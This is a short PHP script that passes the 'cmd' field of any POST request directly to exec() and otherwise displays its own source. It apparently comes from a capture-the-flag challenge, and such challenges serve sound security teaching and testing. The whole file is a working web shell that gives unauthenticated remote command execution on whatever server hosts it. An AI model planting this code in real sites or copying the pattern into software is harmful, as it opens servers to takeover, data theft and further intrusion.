<?php
if(isset($_POST['cmd'])){
    exec($_POST['cmd']);
}
else{
    highlight_file(__FILE__);
}
?>